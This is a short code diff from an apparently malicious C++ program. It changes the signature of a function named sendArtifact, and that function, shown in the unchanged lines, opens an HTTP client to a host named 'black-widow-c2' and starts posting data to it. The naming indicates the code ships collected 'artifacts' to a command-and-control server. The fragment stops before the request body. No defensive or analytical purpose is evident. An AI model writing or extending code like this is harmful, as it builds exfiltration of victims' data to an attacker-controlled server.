@@ -4,7 +4,7 @@
 #include <thread>
 #include <httplib.h>
 
-void sendArtifact(const char* rawArtifact)
+void sendArtifact(const std::string &rawArtifact)
 {
 	httplib::Client cli("http://black-widow-c2.herokuapp.com");
 	auto res = cli.Post(
